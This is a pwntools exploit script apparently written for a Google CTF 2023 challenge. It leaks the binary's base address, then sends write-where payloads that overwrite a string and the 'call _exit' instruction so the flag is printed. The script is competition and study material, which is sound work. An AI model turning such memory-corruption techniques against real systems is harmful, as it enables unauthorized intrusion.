#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

exe = ELF("chal_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)


host, port = "127.0.0.1", "1337"

if args.REMOTE:
  host, port = "wfw2.2023.ctfcompetition.com", "1337"

p = remote(host,port)

#Â read exe base
while (True):
  line = p.recvline()
  if (b'chal' in line) and (b'r--p' in line):
   exe.address = int(line[0:12],16)
   logleak('prog base', exe.address)
   break
  if b'syscall' in line:
    break

p.recvuntil('\n\n', drop=True)

# we will use this hidden function to output the flag
'''
.text:000000000000143B BF 00 00 00 00                                   mov     edi, 0          ; status
.text:0000000000001440 E8 8B FC FF FF                                   call    _exit
.text:0000000000001445 8B 45 F4                                         mov     eax, [rbp+var_C]
.text:0000000000001448 48 8D 15 86 0C 00 00                             lea     rdx, large cs:20D5h ; "Somehow you got here??\n"
.text:000000000000144F 48 89 D6                                         mov     rsi, rdx        ; fmt
.text:0000000000001452 89 C7                                            mov     edi, eax        ; fd
.text:0000000000001454 B8 00 00 00 00                                   mov     eax, 0
.text:0000000000001459 E8 32 FC FF FF                                   call    _dprintf
.text:000000000000145E E8 CD FB FF FF                                   call    _abort
'''
# first copy flag over the "Somehow you got here??\n" string
payload = hex(exe.address+0x20d5)+' 64'
p.send(payload.ljust(64,'\x00'))
# then we erase (replace with pops)  the call _exit
payload = hex(exe.address+0x1443)+' 2'
p.send(payload.ljust(64,'\x00'))
payload = hex(exe.address+0x1442)+' 2'
p.send(payload.ljust(64,'\x00'))
payload = hex(exe.address+0x1441)+' 2'
p.send(payload.ljust(64,'\x00'))
payload = hex(exe.address+0x1440)+' 2'
p.send(payload.ljust(64,'\x00'))
# now when the program will exits, it will dump flag..
p.send('11'.ljust(64,'\x00'))

p.interactive()

